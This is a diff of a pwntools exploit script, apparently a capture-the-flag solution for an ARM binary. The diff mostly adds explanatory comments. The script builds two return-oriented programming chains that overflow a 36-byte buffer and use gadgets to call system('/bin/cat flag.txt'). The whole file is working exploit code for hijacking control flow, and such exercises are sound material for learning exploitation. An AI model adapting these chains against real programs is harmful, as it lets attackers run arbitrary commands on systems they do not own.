@@ -12,7 +12,7 @@ p = process(BINARY)
 
 cat_flag             = p32(0x2103c) # "/bin/cat flag.txt"
 call_system          = p32(0x105E0) # bl system
-PADDING               = b"BBBB"
+PADDING              = b"BBBB"
 
 
 def payload_1():
@@ -21,10 +21,13 @@ def payload_1():
     pop_r3_pc           = p32(0x103a4) # pop {r3, pc}
 
     rop = b"A" * 36
-
+    
+    # Putting the address of "bl system" in r3
+    # --> will be called thanks to 'blx r3' instruction
     rop += pop_r3_pc
     rop += call_system
 
+    # Putting "/bin/cat flag.txt" in r7
     rop += pop_r45678_sb_sl_pc
     rop += PADDING
     rop += PADDING
@@ -33,19 +36,23 @@ def payload_1():
     rop += PADDING
     rop += PADDING
     rop += PADDING
+    
+    # Moving r7 to r0 (register for arg n°1) and calling system("/bin/cat flag.txt")
     rop += mov_r0_r7_blx_r3
     return rop
 
 
 def payload_2():
     mov_r0_r3_pop_pop_pc = p32(0x10558) # mov r0, r3 ; pop {fp, pc}
-    pop_r3_pc           = p32(0x103a4) # pop {r3, pc}
+    pop_r3_pc            = p32(0x103a4) # pop {r3, pc}
     
     rop = b'A' * 36
 
+    # Putting "/bin/cat flag.txt" in r3
     rop += pop_r3_pc
     rop += cat_flag
     
+    # Moving r3 to r0 and calling system("/bin/cat flag.txt")
     rop += mov_r0_r3_pop_pop_pc
     rop += PADDING
     rop += call_system
